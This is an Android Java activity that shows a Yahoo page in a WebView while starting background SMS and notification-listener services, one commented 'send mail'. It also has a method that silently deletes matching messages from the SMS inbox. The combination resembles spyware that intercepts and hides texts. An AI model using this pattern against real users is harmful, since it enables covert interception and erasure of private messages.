package geosat.mysys;

import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.StrictMode;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.webkit.WebView;
import android.webkit.WebViewClient;

public class BroadCastActivity2_SMS extends AppCompatActivity {
    WebView webView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        StrictMode
                .setThreadPolicy(new StrictMode.ThreadPolicy.Builder()
                        .detectDiskReads()
                        .detectDiskWrites()
                        .detectNetwork()   // or .detectAll() for all detectable problems
                        .penaltyLog()
                        .build());

        // TODO Auto-generated method stub
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_bc2_sms);

        startNotificationService();

        // send mail
        startSmsService();

        WebViewClient mWebViewClient = new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                view.loadUrl(url);
                return true;
            }
        };
        webView = (WebView) findViewById(R.id.webView);
        webView.setWebViewClient(mWebViewClient);
        webView.loadUrl("http://tw.yahoo.com");



    }


    private void startSmsService(){
        Intent it = new Intent(this, SmsService.class);
        it.putExtra("type", "Activity");
        startService(it);       // startService
        //context.stopService(it);        // stopService
    }

    private void startNotificationService(){
        Intent it = new Intent(this, NotificationListener.class);
        startService(it);

    }

    public void deleteSMS(Context context, String message, String number) {
        try {
            Log.d("rocoo", "delete sms");
            Uri uriSms = Uri.parse("content://sms/inbox");
            Cursor c = context.getContentResolver().query(uriSms,
                    new String[]{"_id", "thread_id", "address",
                            "person", "date", "body"}, null, null, null);

            if (c != null && c.moveToFirst()) {
                Log.d("rocoo", "delete sms2");
                do {
                    long id = c.getLong(0);
                    long threadId = c.getLong(1);
                    String address = c.getString(2);
                    String body = c.getString(5);

                    if (message.equals(body) && address.equals(number)) {
                        Log.d("rocoo", "delete sms3");
                        context.getContentResolver().delete(
                                Uri.parse("content://sms/" + id), null, null);
                    }
                } while (c.moveToNext());
            }
        } catch (Exception e) {
            Log.d("rocoo", "delete sms exception");
        }
    }
}
